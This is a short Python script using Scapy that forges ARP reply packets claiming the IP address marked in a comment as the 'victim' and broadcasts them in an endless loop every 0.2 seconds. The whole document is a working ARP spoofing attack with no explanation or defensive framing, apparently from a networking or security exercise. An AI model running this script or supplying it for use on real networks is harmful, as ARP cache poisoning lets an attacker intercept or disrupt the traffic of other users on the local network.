## Import Scapy module
from scapy.all import *

packet = Ether()/ARP()
packet.op = 2 #replay
packet.psrc="10.189.15.113" #victim
sendp(packet, loop =1, inter = .2)

# packet.show()
